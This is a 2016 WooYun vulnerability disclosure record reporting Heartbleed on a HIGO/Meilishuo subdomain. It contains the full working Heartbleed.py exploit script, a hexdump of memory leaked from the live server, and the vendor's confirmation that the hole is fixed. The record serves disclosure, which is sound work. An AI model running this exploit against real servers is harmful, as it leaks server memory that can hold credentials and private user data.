{"id": 85760, "wybug_id": "wooyun-2016-0186026", "wybug_title": "美丽说HIGO某站心脏滴血", "wybug_corp": "美丽说", "wybug_author": "Aasron", "wybug_date": "2016-03-18 09:27", "wybug_open_date": "2016-03-18 12:39", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-18：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 美丽说HIGO某站心脏滴血 详细说明：  本来是想测试一个链接的higo.meilishuo.comHeartbleed.py\n#!/usr/bin/python# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)# The author disclaims copyright to this source code.import sysimport structimport socketimport timeimport selectimport refrom optparse import OptionParseroptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')def h2bin(x):    return x.replace(' ', '').replace('\\n', '').decode('hex')hello = h2bin('''16 03 02 00  dc 01 00 00 d8 03 02 5343 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cfbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 0000 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 8800 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1cc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0cc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 1100 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 0403 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 1900 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 0800 06 00 07 00 14 00 15  00 04 00 05 00 12 00 1300 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 0000 0f 00 01 01                                  ''')hb = h2bin(''' 18 03 02 00 0301 40 00''')def hexdump(s):    for b in xrange(0, len(s), 16):        lin = [c for c in s[b : b + 16]]        hxdat = ' '.join('%02X' % ord(c) for c in lin)        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)        print '  %04x: %-48s %s' % (b, hxdat, pdat)    printdef recvall(s, length, timeout=5):    endtime = time.time() + timeout    rdata = ''    remain = length    while remain > 0:        rtime = endtime - time.time()         if rtime < 0:            return None        r, w, e = select.select([s], [], [], 5)        if s in r:            data = s.recv(remain)            # EOF?            if not data:                return None            rdata += data            remain -= len(data)    return rdata        def recvmsg(s):    hdr = recvall(s, 5)    if hdr is None:        print 'Unexpected EOF receiving record header - server closed connection'        return None, None, None    typ, ver, ln = struct.unpack('>BHH', hdr)    pay = recvall(s, ln, 10)    if pay is None:        print 'Unexpected EOF receiving record payload - server closed connection'        return None, None, None    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))    return typ, ver, paydef hit_hb(s):    s.send(hb)    while True:        typ, ver, pay = recvmsg(s)        if typ is None:            print 'No heartbeat response received, server likely not vulnerable'            return False        if typ == 24:            print 'Received heartbeat response:'            hexdump(pay)            if len(pay) > 3:                print 'WARNING: server returned more data than it should - server is vulnerable!'            else:                print 'Server processed malformed heartbeat, but did not return any extra data.'            return True        if typ == 21:            print 'Received alert:'            hexdump(pay)            print 'Server returned error, likely not vulnerable'            return Falsedef main():    opts, args = options.parse_args()    if len(args) < 1:        options.print_help()        return    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    print 'Connecting...'    sys.stdout.flush()    s.connect((args[0], opts.port))    print 'Sending Client Hello...'    sys.stdout.flush()    s.send(hello)    print 'Waiting for Server Hello...'    sys.stdout.flush()    while True:        typ, ver, pay = recvmsg(s)        if typ == None:            print 'Server closed connection without sending Server Hello.'            return        # Look for server hello done message.        if typ == 22 and ord(pay[0]) == 0x0E:            break    print 'Sending heartbeat request...'    sys.stdout.flush()    s.send(hb)    hit_hb(s)if __name__ == '__main__':    main()\n   漏洞证明：  \n2d80: 31 30 30 22 3A 22 2D 31 22 2C 22 65 78 70 5F 63  100\":\"-1\",\"exp_c 2d90: 6F 75 6E 74 72 79 5F 6E 61 6D 65 22 3A 22 5C 75  ountry_name\":\"\\u 2da0: 37 66 38 65 5C 75 35 36 66 64 22 2C 22 65 78 70  7f8e\\u56fd\",\"exp 2db0: 5F 63 6F 75 6E 74 72 79 5F 69 64 22 3A 22 22 2C  _country_id\":\"\", 2dc0: 22 69 73 5F 6D 65 72 67 65 5F 61 64 64 72 65 73  \"is_merge_addres 2dd0: 73 5F 6D 65 73 73 61 67 65 22 3A 22 30 22 2C 22  s_message\":\"0\",\" 2de0: 66 69 6C 74 65 72 5F 61 64 64 72 65 73 73 5F 63  filter_address_c 2df0: 68 61 72 61 63 74 65 72 73 22 3A 22 22 7D 2C 7B  haracters\":\"\"},{ 2e00: 22 65 78 70 5F 63 6F 6D 70 61 6E 79 5F 69 64 22  \"exp_company_id\" 2e10: 3A 22 35 38 35 22 2C 22 65 78 70 5F 63 6F 6D 70  :\"585\",\"exp_comp 2e20: 61 6E 79 5F 63 6F 64 65 22 3A 22 48 61 69 54 61  any_code\":\"HaiTa 2e30: 6F 4C 61 6E 64 22 2C 22 65 78 70 5F 63 6F 6D 70  oLand\",\"exp_comp 2e40: 61 6E 79 5F 6E 61 6D 65 22 3A 22 5C 75 36 64 37  any_name\":\"\\u6d7 2e50: 37 5C 75 36 64 64 38 5C 75 35 39 32 37 5C 75 39  7\\u6dd8\\u5927\\u9 2e60: 36 34 36 22 2C 22 65 78 70 5F 63 6F 6D 70 61 6E  646\",\"exp_compan 2e70: 79 5F 6D 74 69 6D 65 22 3A 22 31 34 35 33 31 32  y_mtime\":\"145312 2e80: 36 30 33 36 22 2C 22 65 78 70 5F 63 6F 6D 70 61  6036\",\"exp_compa 2e90: 6E 79 5F 63 74 69 6D 65 22 3A 22 31 34 35 30 31  ny_ctime\":\"14501 2ea0: 34 37 38 33 35 22 2C 22 65 78 70 5F 63 6F 6D 70  47835\",\"exp_comp 2eb0: 61 6E 79 5F 73 74 61 74 75 73 22 3A 22 31 22 2C  any_status\":\"1\", 2ec0: 22 65 78 70 5F 75 73 65 5F 6B 75 61 69 64 69 31  \"exp_use_kuaidi1 2ed0: 30 30 22 3A 22 2D 31 22 2C 22 65 78 70 5F 63 6F  00\":\"-1\",\"exp_co 2ee0: 75 6E 74 72 79 5F 6E 61 6D 65 22 3A 22 5C 75 39  untry_name\":\"\\u9 2ef0: 37 65 39 5C 75 35 36 66 64 22 2C 22 65 78 70 5F  7e9\\u56fd\",\"exp_ 2f00: 63 6F 75 6E 74 72 79 5F 69 64 22 3A 22 22 2C 22  country_id\":\"\",\"\n   修复方案：  补丁！   版权声明：转载请注明来源 Aasron@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2016-03-18 12:22 厂商回复： 非常感谢您对美丽说安全的关注，目前HIGO与美丽说已成为两家独立的公司，经确认，该域名目前指向的IP地址为HIGO所有，报告中的问题并不会对美丽说安全造成影响；但为了避免此问题对HIGO造成影响，已经通知HIGO技术团队及时解决，在这里代HIGO的同学向漏洞提交者表示感谢！ 最新状态： 2016-03-18：该漏洞已修复，谢谢！  ", "replys": "漏洞评价：\n评价\n     2016-03-18 10:00 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:7        | 带我玩)\t\t \n  看看大牛的姿势    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}